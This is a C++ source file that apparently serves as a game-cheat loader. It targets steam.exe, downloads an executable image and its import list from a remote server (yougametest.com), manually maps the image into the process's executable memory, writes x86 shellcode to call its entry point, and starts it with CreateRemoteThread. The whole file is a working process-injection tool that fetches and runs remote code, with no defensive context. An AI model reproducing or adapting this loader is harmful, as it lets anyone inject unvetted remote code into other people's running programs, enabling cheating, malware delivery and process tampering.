#include <Windows.h>
#include <iostream>
#include <cstdint>

#include "requests.hpp"
#include "remote.hpp"

#define DOMAIN "yougametest.com"
#define SCRIPT_PATH "/debil/api.php"


namespace api {
	struct initial_data_t {
	public:
		struct import_t {
		public:
			std::string m_module;
			std::unordered_map<std::string, std::uintptr_t> m_functions;
		};

		std::vector<import_t> m_imports;
		std::size_t m_size;
		std::uintptr_t m_entry;
	};

	initial_data_t get_initial_data() {
		auto [resp, err] = networking::get(DOMAIN, SCRIPT_PATH "?data");
		if (err)
			throw std::runtime_error("unable to get initial data");

		initial_data_t data;

		const auto import_data = resp["imports"].get<nlohmann::json::object_t>();
		for (auto [module_name, functions] : import_data) {
			auto& imported_module = data.m_imports.emplace_back();

			imported_module.m_module = module_name;
			for (auto&& func_name : functions)
				imported_module.m_functions.emplace(func_name, 0);
		}

		data.m_size = resp.at("size").get<std::size_t>();
		data.m_entry = resp.at("entry").get<std::uintptr_t>();

		return data;
	}

	std::vector<uint8_t> get_binary(std::uintptr_t base, initial_data_t& initial_data) {
		nlohmann::json imports_data;

		for (auto& import_data : initial_data.m_imports)
			imports_data[import_data.m_module] = import_data.m_functions;

		auto [resp, err] = networking::get(DOMAIN, (std::string(SCRIPT_PATH"?image=1&base=") + std::to_string(base) + "&imports=" + imports_data.dump()).c_str());
		if (err)
			throw std::runtime_error("unable to get binary");

		return resp.get<std::vector<std::uint8_t>>();
	}
}


namespace detail {
	void* get_process_by_name(const wchar_t* name) {
		void* thSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (thSnapShot == INVALID_HANDLE_VALUE)
			return nullptr;

		PROCESSENTRY32W pe;
		pe.dwSize = sizeof(PROCESSENTRY32W);

		unsigned long ret = 0;
		for (bool proc = Process32FirstW(thSnapShot, &pe); proc; proc = Process32NextW(thSnapShot, &pe)) {
			if (wcscmp(pe.szExeFile, name))
				continue;
			ret = pe.th32ProcessID;
			break;
		}

		CloseHandle(thSnapShot);

		return ret ? OpenProcess(PROCESS_ALL_ACCESS, false, ret) : nullptr;
	}
}


int main() try {
	void* proc = detail::get_process_by_name(L"steam.exe");
	if (!proc) {
		std::cerr << "process not found" << std::endl;
		return EXIT_FAILURE;
	}

	auto initial_data = api::get_initial_data();
	std::cout << "got initial_data | size: " << initial_data.m_size << std::endl;

	for (auto& import : initial_data.m_imports) {
		auto mod_base = remote::get_module_base(proc, import.m_module);

		for (auto [function_name, _] : import.m_functions) {
			auto exp = remote::get_proc_address(proc, mod_base, function_name);
			if (!exp)
				throw std::runtime_error("unable to get export " + function_name);
			
			import.m_functions[function_name] = exp;
			std::cout << "[~] " << function_name << " @ " << std::hex << std::showbase << exp << std::endl;
		}
	}

	const auto base = remote::alloc_raw(proc, initial_data.m_size, PAGE_EXECUTE_READWRITE, MEM_COMMIT);
	if (!base)
		throw std::runtime_error("no base?");

	const auto bin = api::get_binary(base, initial_data);
	if (!remote::write_raw(proc, base, bin.data(), bin.size(), nullptr))
		throw std::runtime_error("unable to write final binary");

	std::vector<std::uint8_t> invoke_ep_shell = {
		0x83, 0xEC, 0x28, // sub esp, 0x28
		0x68, 0x00, 0x00, 0x00, 0x00, // push reserved
		0x68, 0x01, 0x00, 0x00, 0x00, // push DLL_PROCESS_ATTACH
		0x68, 0x00, 0x00, 0x00, 0x00, // push base
		0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, entrypoint
		0xFF, 0xD0, // call eax
		0x83, 0xC4, 0x28, // add esp, 0x28
		0xC3 // ret
	};

	*reinterpret_cast<std::uintptr_t*>(&invoke_ep_shell[4]) = 0x1337; // reserved value
	*reinterpret_cast<std::uintptr_t*>(&invoke_ep_shell[14]) = base;
	*reinterpret_cast<std::uintptr_t*>(&invoke_ep_shell[19]) = base + initial_data.m_entry;

	if (!remote::write_raw(proc, base, invoke_ep_shell.data(), invoke_ep_shell.size(), nullptr))
		throw std::runtime_error("unable to write shellcode");

	CreateRemoteThread(proc, nullptr, 0, LPTHREAD_START_ROUTINE(base), nullptr, 0, nullptr);
	
	std::cout << "[~] done" << std::endl;
	return EXIT_SUCCESS;
}
catch (std::runtime_error& err) {
	std::cerr << "EXCEPTION: " << err.what() << std::endl;
	return EXIT_FAILURE;
}

static_assert(sizeof(void*) == 4, "go fuck yourself");
